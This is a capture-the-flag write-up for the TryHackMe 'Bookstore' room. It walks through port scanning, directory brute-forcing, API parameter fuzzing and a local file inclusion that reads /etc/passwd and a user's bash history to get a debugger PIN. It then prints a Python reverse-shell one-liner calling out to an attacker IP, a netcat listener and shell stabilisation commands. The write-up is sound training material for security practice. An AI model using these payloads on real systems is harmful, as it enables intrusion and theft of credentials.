@@ -1,0 +1,257 @@
+			  ____              _        _                 
+			 |  _ \            | |      | |                
+			 | |_) | ___   ___ | | _____| |_ ___  _ __ ___ 
+			 |  _ < / _ \ / _ \| |/ / __| __/ _ \| '__/ _ \
+			 | |_) | (_) | (_) |   <\__ \ || (_) | | |  __/
+			 |____/ \___/ \___/|_|\_\___/\__\___/|_|  \___|
+						                       
+               A Beginner level box with basic web enumeration and REST API Fuzzing.
+
+https://tryhackme.com/room/bookstoreoc
+
+This write-up is not focused on the full challenge as the challenge is not only 
+web API hacking but also reverse engineering and binary exploitation. Here we focus
+on the reconnaissance phase of hacking a Rest API.
+
+Port scanning:
+===============
+We'll run a basic nmap scan on the server to see if it returns anything that
+could potentially be interesting and also to get a general view of the server.
+
+nmap -sC -sV -A 10.10.4.214
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
+|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
+|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Book Store
+5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
+|_http-title: Home
+| http-robots.txt: 1 disallowed entry 
+|_/api </p> 
+
+Using nmap we discover the API is running on port :5000 with the endpoint
+being /api discovered in the /robots.txt file.
+
+Directory Brute-Forcing:
+========================
+To discover paths and files we use gobuster to enumerate the main website
+and the discovered API endpoint on port :5000.
+
+Main website:
+
+gobuster dir -u "http://10.10.4.214/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+===============================================================
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/assets               (Status: 301) [Size: 311] [--> http://10.10.4.214/assets/]
+/favicon.ico          (Status: 200) [Size: 15406]
+/images               (Status: 301) [Size: 311] [--> http://10.10.4.214/images/]
+/javascript           (Status: 301) [Size: 315] [--> http://10.10.4.214/javascript/]
+/server-status        (Status: 403) [Size: 276]
+===============================================================
+
+API endpoint:
+
+gobuster dir -u "http://10.10.4.214:5000/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+===============================================================
+/api                  (Status: 200) [Size: 825]
+/console              (Status: 200) [Size: 1985]
+/robots.txt           (Status: 200) [Size: 45]
+===============================================================
+
+After enumerating the main site and the API we now 
+discover not only /api but also /console which seems to 
+require pin authentication but has potential for us to
+gain remote command execution ovet the server.
+
+From the nmap scan, we can see the API is running on port :5000.
+From here we go to http://10.10.4.214:5000/api/ and discover the
+API documentation. We can use the documentation as apart of our
+reconnaissance to better understand the API.
+
+API Documentation:
+===================
+Since every good API has documentation we have one as well!
+We can use API documentation to learn how the API works,
+discover various paths, files, endpoints, parameters and functionality.
+
+/api/v2/resources/books/all (Retrieve all books and get the output in a json format)
+/api/v2/resources/books/random4 (Retrieve 4 random records)
+/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)
+/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
+/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
+/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
+
+Immediately we focus on /api/v2 as is common with web APIs they 
+can have /v1, /v2, /v3. Older versions of an API may also have vulnerabilities
+that were patched in newer versions but since the older API version
+is still sitting on the server we may be able to exploit this regardless
+of the new and improved, seucre v2 version.
+
+Source code analysis:
+======================
+We visit the main bookstore website http://10.10.4.214/index.html and start
+viewing the page source and javascript files for anything interesting. This
+could be paths, files, functionality or comments.
+
+At the bottom of the page source we see a comment called <!-- Scripts -->,
+this is where seemingly custom and non-custom javascript files sit. We ignore
+the standard jQuery files and focus on files that look to be more custom:
+
+assets/js/util.js
+assets/js/main.js
+
+Nothing stands out to us so we go to the navbar tag and visit
+the other pages on the site:
+
+index.html
+books.html
+login.html
+
+We discovered a developer comment in /login.html:
+
+"Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file".
+
+Clicking through we see /books.html and there we see more javascript files:
+
+assets/js/api.js
+assets/js/util.js
+assets/js/main.js
+
+Here we see assets/js/api.js file which is interesting.
+The /assets directory also has directory indexing available
+which was discovered using gobuster previously.
+
+In api.js file, we see a comment that says the following:
+
+"//the previous version of the API had a parameter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.".
+
+We already know there exists /api/v1 and /api/v2. This comment says there is a pre-existing
+vulnerability on the older version of the API. Since v2 seems to be the latest version we focus on v1.
+We visit the API documentation, and look for parameters and values where a possible local file inclusion could
+exist and change the /api/v2 to /api/v1.
+
+/api/v1/resources/books?id=/etc/passwd
+/api/v1/resources/books?author=/etc/passwd
+/api/v1/resources/books?published=/etc/passwd
+/api/v1/resources/books?author=/etc/passwd
+
+In the documentation, we see three different parameters:
+
+id=
+author=
+published=
+
+Since changing the version of the API to v1 and testing the payload '/etc/passwd' on the endpoints
+we couldn't get an LFI vulnerability to pop. Perhaps there is another parameter that is vulnerable that
+is not listed in the documentation. Here we fuzz the parameter value hoping to find more parameters
+not previously disclosed in the API's documentation.
+
+Fuzzing:
+=========
+ffuf -u "http://10.10.4.214:5000/api/v1/resources/books?FUZZ=1993" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+After using ffuf to fuzz the parameter value we discover a new paramter called 'show':
+* FUZZ: author
+* FUZZ: id
+* FUZZ: published
+* FUZZ: show <---- New Param Found!
+
+Now we change the parameter to 'show' and use the payload '/etc/passwd' as our
+proof of concept.
+
+LFI POC:
+=========
+curl http://10.10.4.214:5000/api/v1/resources/books?show=/etc/passwd   
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+
+After finding the developer's comment before saying that Sids
+debugger pin to the :5000/console is in his bash history we will
+use the LFI vulnerability to get the pin.
+
+Sids PIN code:
+===============
+curl http://10.10.4.214:5000/api/v1/resources/books?show=/home/sid/.bash_history                         
+
+cd /home/sid
+whoami
+export WERKZEUG_DEBUG_PIN=123-321-135
+echo $WERKZEUG_DEBUG_PIN
+python3 /home/sid/api.py
+ls
+exit
+
+From the bash history of the Sid user, we can see that the pin is
+'123-321-135'. We will use this to authenticate onto the console
+which seems to be a python debugger.
+
+Going to the payload of all the things GitHub we can use one of their python reverse
+shells.
+
+Python reverse shell:
+=====================
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.5.169",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+
+nc -lvnp 8888                                
+listening on [any] 8888 ...
+connect to [10.11.5.169] from (UNKNOWN) [10.10.4.214] 48722
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+Shell stabilisation:
+=====================
+As per best practices, we will stabilise our reverse shell for
+convenience and functionality.
+
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+stty rows 0 cols 0
+export SHELL=bash
+export TERM=xterm-256color
+press CTRL+Z
+stty raw -echo ; fg
+reset
+
+sid@bookstore:~$ ls
+api.py  api-up.sh  books.db  try-harder  user.txt
+
+From here we can find the user flag in Sids home directory (/home/sid) and 
+to gain root we'll need to reverse-engineer the 'try-harder' elf binary which is 
+beyond the scope of this write-up as this write up focuses on the 
+reconnaissance phase of hacking a web API.
+
+sid@bookstore:~$ file try-harder
+try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped
